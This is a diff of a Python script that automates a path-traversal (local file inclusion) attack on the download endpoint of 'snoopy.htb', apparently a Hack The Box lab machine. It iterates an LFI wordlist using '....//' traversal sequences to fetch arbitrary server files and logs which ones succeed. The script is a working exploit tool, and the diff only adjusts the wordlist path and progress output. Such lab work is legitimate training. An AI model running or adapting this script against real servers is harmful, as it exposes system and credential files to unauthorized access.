@@ -2,11 +2,11 @@
 # It will print out two files, one with all of the results and one with the errors in your current working directory.
 # It will also print out what position it is at.
 
-
 import requests
 import zipfile
 import io
 import os
+import sys
 import logging
 import concurrent.futures
 
@@ -25,8 +25,8 @@ if os.path.isfile(result_path):
 if os.path.isfile(errors_path):
     os.remove(errors_path)
 
-#wordlist_path = "/usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt"
-wordlist_path = cwd + "/LFI_fileFinder_wordlist.txt"
+wordlist_path = "/usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt"
+# #wordlist_path = cwd + "/LFI_fileFinder_wordlist.txt"
 
 file =  open(f"{wordlist_path}", mode="r")
 file_errors =  open(f"{errors_path}", mode="w")
@@ -35,10 +35,14 @@ result_file = open('result.txt', 'a')
 words = file.readlines()
 #r = requests.Response()
 
+wordsToCheck = len(words)
+
 def fileloop():
-    
+    print(wordsToCheck)
+    wordsChecked = 0
     for word in words:
-        print("Checking: " + word)
+        wordsChecked = wordsChecked + 1
+        print(str(wordsChecked) + "/" + str(wordsToCheck) + "\t" + "Checking: " + word )
         r = requests.get("http://snoopy.htb/download?file=....//....//....//....//....//....//....//" + word.strip(), allow_redirects=True)
         if(isContentEmpty(r)):
             continue
